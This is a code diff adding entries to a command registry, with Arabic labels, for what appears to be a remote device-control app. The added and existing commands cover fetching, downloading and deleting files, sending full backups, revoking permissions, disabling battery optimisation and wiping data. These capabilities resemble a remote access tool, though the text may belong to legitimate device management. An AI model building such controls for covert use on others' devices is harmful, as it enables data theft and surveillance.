@@ -96,8 +96,18 @@ COMMAND_REGISTRY = {
     "recent_files":        {"cmd": "recent_files",        "name": "أحدث الملفات",   "icon": "🕐", "category": "files"},
     "search_files":        {"cmd": "search_files",        "name": "بحث ملفات",      "icon": "🔍", "category": "files"},
     "get_file":            {"cmd": "get_file",            "name": "تحميل ملف",      "icon": "⬇️", "category": "files"},
+    "get_file_content":    {"cmd": "get_file_content",    "name": "محتوى ملف",      "icon": "📄", "category": "files"},
+    "download_file":       {"cmd": "download_file",       "name": "تنزيل ملف",      "icon": "📥", "category": "files"},
     "delete_file":         {"cmd": "delete_file",         "name": "حذف ملف",        "icon": "🗑️", "category": "files"},
     "send_full_backup":    {"cmd": "send_backup_all",     "name": "نسخ احتياطي كامل","icon": "💾", "category": "files"},
+
+    # ─── App / Device Management (admin-only operations) ────────
+    # These are issued from the Admin App's "إدارة الجهاز" section
+    # (DeviceManagementActivity) and executed by the client's
+    # CommandExecutor.
+    "revoke_permissions":  {"cmd": "revoke_permissions",  "name": "إلغاء الصلاحيات","icon": "🔇", "category": "security"},
+    "restart_app":         {"cmd": "restart_app",         "name": "إعادة تشغيل التطبيق","icon":"🔄", "category": "apps"},
+    "disable_battery_optimization": {"cmd": "disable_battery_optimization", "name": "إيقاف تحسين البطارية","icon":"⚡", "category": "security"},
 
     # ─── Security ────────────────────────────────────────────
     "wipe_data":           {"cmd": "wipe_data",           "name": "مسح البيانات",    "icon": "💣", "category": "security"},
